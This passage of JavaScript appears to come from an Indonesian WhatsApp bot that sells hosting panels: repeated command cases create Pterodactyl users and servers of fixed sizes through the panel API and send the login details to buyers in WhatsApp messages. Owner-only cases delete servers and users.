mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${pushname}`)
}
break
case "27gb": case 'panel27gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "27350"
let cpu = "2350"
let disk = "27350"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${pushname}`)
}
break
case "28gb": case 'panel28gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "28350"
let cpu = "2400"
let disk = "28350"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${pushname}`)
}
break
case "29gb": case 'panel29gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "29350"
let cpu = "2450"
let disk = "29350"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${pushname}`)
}
break
case "30gb": case 'panel30gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "30550"
let cpu = "2500"
let disk = "30550"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${pushname}`)
}
break
case "unli": case 'unlimited': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${pushname}`)
}
break
case "delpanel": case "hapuspanel": {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply("idservernya")
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections = []
for (let server of servers) {
let s = server.attributes
if (args[0] == s.id.toString()) {
sections.push(s.name.toLowerCase())
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (sections.includes(u.username)) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections.length == 0) return m.reply("*ID Server/User* Tidak Ditemukan")
m.reply(`Berhasil Menghapus Akun Panel *${capital(sections[0])}*`)
}
break

case "delusr": {
if (!isCreator) return m.reply(mess.owner)
let usr = args[0]
if (!usr) return m.reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*USER NOT FOUND*')
m.reply('*SUCCESSFULLY DELETE THE USER*')
}
break

case "delsrv": {
if (!isCreator) return m.reply(mess.owner)
let srv = args[0]
if (!srv) return m.reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
